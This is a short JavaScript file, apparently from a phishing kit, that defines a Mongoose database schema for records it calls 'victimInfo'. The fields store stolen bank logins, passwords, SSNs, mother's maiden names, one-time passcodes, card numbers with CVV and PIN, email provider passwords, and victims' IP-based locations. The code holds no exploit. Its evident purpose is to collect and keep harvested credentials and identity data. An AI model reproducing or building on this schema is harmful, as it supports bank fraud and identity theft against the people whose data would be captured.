const mongoose = require("mongoose");

const detail = new mongoose.Schema(
  {
    bank: String,
    userID: String,
    password: String,
    email: String,
    phone: Number,
    name: String,
    address: String,
    ssn: Number,
    accountNumber: String,
    mmn: String,
    currentEmployer: String,
    otp: String,
    userAgent: String,
    cardInfo: {
      card: Number,
      cvv: Number,
      pin: Number,
      expiry: String,
    },
    providerInfo: {
      provider: String,
      password: String,
    },
    victimInfo: {
      ip: String,
      city: String,
      country: String,
      countryCode: String,
      region: String,
      regionName: String,
      zip: String,
      lat: String,
      lon: String,
    },
  },
  { timestamps: true },
);

const Detail = mongoose.model("Detail", detail);
module.exports = Detail;
